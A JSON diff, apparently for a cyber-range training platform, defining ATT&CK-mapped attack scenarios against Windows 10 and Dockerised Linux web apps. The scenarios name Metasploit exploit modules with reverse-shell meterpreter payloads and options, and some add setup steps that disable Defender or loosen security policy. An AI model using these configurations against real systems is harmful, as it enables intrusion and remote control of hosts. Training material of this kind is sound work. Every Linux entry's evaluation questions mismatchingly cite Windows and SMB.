@@ -1,0 +1,805 @@
+{
+    "windows_10_1511": {
+        "TA01_T1190_P1": {
+            "scenario_tactic": {
+                "name": "Initial_Access",
+                "id": "TA0001"
+            },
+            "scenario_technique": {
+                "name": "Exploit Public-Facing Application",
+                "id": "T1190"
+            },
+            "procedure": {
+                "classification": {
+                    "scenario_type": "active_scenario",
+                    "name": "ms17_010_psexec",
+                    "classification_id": "TA01_T1190_P1",
+                    "job-role": "System/Network Admin",
+                    "difficulty": "4"
+                },
+                "environment": {
+                    "platform": "Windows 10 pro",
+                    "version": "1511",
+                    "service-protocol": "SMB",
+                    "cve": "2017-0147, 2017-0146, 2017-0143",
+                    "configuration": {
+                        "settings": {
+                            "1": "Edit 'Local security policy  -> Security Settings -> Local Policies -> Security OptionsNetwork acess: Named pipes that can be accessed anonymously' add 'netlogon' (without quotes)",
+                            "2": "disable defender"
+                        }
+                    }
+                },
+                "execution": {
+                    "spawn_seperate_session": true,
+                    "tool": "metasploit",
+                    "exploit": "windows/smb/ms17_010_psexec",
+                    "payload": "windows/meterpreter/reverse_tcp",
+                    "options": {
+                        "LHOST": "LHOST_$ref",
+                        "LPORT": "LPORT_$ref",
+                        "RHOSTS": "RHOSTS_$ref"
+                    },
+                    "access": {
+                        "access-type": "Sharing",
+                        "access-level": "remote service",
+                        "path-execution-file": ""
+                    }
+                }
+            },
+            "dynamic_procedures":[
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA03_T1050_P1",
+                        "proc_name": "persistence_service",
+                        "scenario_tactic": "Persistence"
+                    }
+                },
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA03_T1060_P1",
+                        "proc_name": "persistence_exe",
+                        "scenario_tactic": "Persistence"
+                    }
+                },
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA03_T1060_P2",
+                        "proc_name": "registry_persistence",
+                        "scenario_tactic": "Persistence"
+                    }
+                }
+            ]
+        },
+        "TA01_T1091_P1": {
+            "scenario_tactic": {
+                "name": "Initial_Access",
+                "id": "TA0001"
+            },
+            "scenario_technique": {
+                "name": "Replication Through Removable Media",
+                "id": "T1091"
+            },
+            "procedure": {
+                "classification": {
+                    "scenario_type": "active_scenario",
+                    "name": "Payload_listener",
+                    "classification_id": "TA01_T1091_P1",
+                    "job-role": "System/Network Admin",
+                    "difficulty": "3"
+                },
+                "environment": {
+                    "platform": "Windows 10 pro",
+                    "version": "1511",
+                    "service-protocol": null,
+                    "cve": "",
+                    "configuration": {
+                        "settings": {
+                            "1": "disable defender"
+                        }
+                    }
+                },
+                "execution": {
+                    "prerequisite": [
+                        {
+                        "scenario_tactic": "Build_Capabilities",
+                        "proc_id": "TA24_T1345_P1",
+                        "type": "helper_scenario"
+                    },
+                    {
+                        "scenario_tactic": "Lateral_Movement",
+                        "proc_id": "TA08_T1105_P1",
+                        "type": "helper_scenario"
+                    }
+                ],
+                    "postrequisite": [
+                        {
+                        "scenario_tactic": "Execution",
+                        "proc_id": "TA02_T1059_P1",
+                        "type": "helper_scenario"
+                    }
+                ],  
+                    "spawn_seperate_session": true,
+                    "type": "listener",
+                    "service": "None",
+                    "tool": "metasploit",
+                    "exploit": "multi/handler",
+                    "payload": "windows/x64/meterpreter/reverse_tcp",
+                    "options": {
+                        "LHOST": "LHOST_$ref",
+                        "LPORT": "LPORT_$ref->Build_Capabilities"
+                    },
+                    "separate-thread": "yes",
+                    "access": {
+                        "access-type": "",
+                        "access-level": "",
+                        "path-execution-file": ""
+                    }
+                }
+            },
+            "dynamic_procedures": [
+                {
+                    "sub_procedure": {
+                        "proc_id": "TA04_T1088_P1",
+                        "proc_name": "bypassuac_sluihijack",
+                        "scenario_tactic": "Privilege_Escalation"
+                    }
+                }
+            ]
+        }
+    },
+    "linux": {
+        "S.01.1190.2": {
+            "scenario-id": "S.01.1190.2",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "Apprain",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "multi/http/apprain_upload_exec",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "87",
+                    "TARGETURI": "/apprain/webroot/"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.3": {
+            "scenario-id": "S.01.1190.3",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "extplorer",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "multi/http/extplorer_upload_exec",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "87",
+                    "TARGETURI": "/extplorer/"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.4": {
+            "scenario-id": "S.01.1190.4",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "Libretto",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "unix/webapp/libretto_upload_exec",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "87",
+                    "TARGETURI": "/librettoCMS"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.5": {
+            "scenario-id": "S.01.1190.5",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "mobilecartly",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "multi/http/mobilecartly_upload_exec",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "87"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.6": {
+            "scenario-id": "S.01.1190.6",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "Project Pier",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "unix/webapp/projectpier_upload_exec",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "87",
+                    "TARGETURI": "/projectpier"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.7": {
+            "scenario-id": "S.01.1190.7",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "sflog",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "multi/http/sflog_upload_exec",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "87"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.8": {
+            "scenario-id": "S.01.1190.8",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "VCMS",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "linux/http/vcms_upload",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "87",
+                    "TARGETURI": "/VCMS"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.9": {
+            "scenario-id": "S.01.1190.9",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "WebPageTest",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "multi/http/webpagetest_upload_exec",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "87",
+                    "TARGETURI": "/webpagetest/"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.10": {
+            "scenario-id": "S.01.1190.10",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "Xoda",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "unix/webapp/xoda_file_upload",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "87"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.11": {
+            "scenario-id": "S.01.1190.11",
+            "env": {
+                "os": {
+                    "name": "Command Injection Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "AjaXplorer",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "multi/http/ajaxplorer_checkinstall_exec",
+                "payload": "cmd/unix/reverse",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "78",
+                    "TARGETURI": "AjaXplorer-2.5.5/"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.12": {
+            "scenario-id": "S.01.1190.12",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "Basilic",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "unix/webapp/basilic_diff_exec",
+                "payload": "cmd/unix/reverse",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "78",
+                    "TARGETURI": "basilic-1.5.14/"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.13": {
+            "scenario-id": "S.01.1190.13",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "Log1CMS",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "multi/http/log1cms_ajax_create_folder",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "78"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.14": {
+            "scenario-id": "S.01.1190.14",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "LotusCMS",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "multi/http/lcms_php_exec",
+                "payload": "php/meterpreter/reverse_tcp",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "78"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.15": {
+            "scenario-id": "S.01.1190.15",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "PHPCharts",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "unix/webapp/php_charts_exec",
+                "payload": "cmd/unix/reverse",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "78"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        },
+        "S.01.1190.16": {
+            "scenario-id": "S.01.1190.16",
+            "env": {
+                "os": {
+                    "name": "Arbitrary File Upload Docker",
+                    "version": ""
+                },
+                "settings": {
+                    "run_Docker": "sudo docker run -it -p 87:80 arb-file bash",
+                    "run_service": "sudo service apache2 start"
+                }
+            },
+            "goals": {
+                "tactic": {
+                    "name": "Initial_Access",
+                    "id": "TA0001",
+                    "technique": {
+                        "name": "Exploit Public-Facing Application",
+                        "id": "T1190",
+                        "service": "Apache"
+                    }
+                }
+            },
+            "procedure": {
+                "name": "PHPtax",
+                "paltform": "Ubuntu-16.04.2",
+                "service": "Apache2",
+                "tool": "metasploit",
+                "exploit": "multi/http/phptax_exec",
+                "payload": "cmd/unix/reverse",
+                "options": {
+                    "LHOST": "None",
+                    "LPORT": "4444",
+                    "RHOSTS": "None",
+                    "RPORT": "78"
+                }
+            },
+            "difficulty": "3/5",
+            "evaluation": {
+                "question-1": "related to Windows: Local security  policy review (see Environment specification section)",
+                "question-2": "related to Network logs for smb connections"
+            }
+        }
+    }
+}
